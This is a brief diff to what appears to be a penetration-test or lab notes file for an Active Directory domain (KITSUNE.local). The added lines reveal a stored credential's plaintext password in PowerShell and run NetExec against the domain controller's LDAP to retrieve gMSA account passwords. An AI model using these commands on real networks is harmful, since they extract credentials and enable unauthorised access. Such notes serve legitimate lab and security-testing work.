@@ -91,3 +91,6 @@ $cred.GetType().FullName
 # Check the username
 $cred.UserName
 
+#runnin cmds as pebbles fail because they dont have winrm
+$cred.GetNetworkCredential().Password
+nxc ldap DC01.KITSUNE.local -u 'pebble' -p 'Password' --gmsa # be careful, don't accidentally do pebbles
